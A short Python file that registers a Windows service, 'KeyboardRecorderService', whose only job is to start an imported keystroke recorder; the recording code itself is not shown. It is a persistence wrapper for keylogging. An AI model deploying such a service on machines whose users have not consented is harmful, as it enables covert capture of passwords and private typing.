import pythoncom
import win32serviceutil
import win32service
import win32event
import win32api
import servicemanager
import socket

from keyPressRecorder import keyPressRecorder

class KeyPressRecorderSvc (win32serviceutil.ServiceFramework):
    _svc_name_ = "KeyboardRecorderService"
    _svc_display_name_ = "Key Press Recorder Service"

    def __init__(self,args):
        win32serviceutil.ServiceFramework.__init__(self,args)
        self.hWaitStop = win32event.CreateEvent(None,0,0,None)
        socket.setdefaulttimeout(60)

    def SvcStop(self):
        self.ReportServiceStatus(win32service.SERVICE_STOP_PENDING)
        win32event.SetEvent(self.hWaitStop)

    def SvcDoRun(self):
        self.ReportServiceStatus(win32service.SERVICE_RUNNING)
        self.run()

    def run(self):
        keyPressRecorder()

if __name__ == '__main__':
    win32serviceutil.HandleCommandLine(KeyPressRecorderSvc)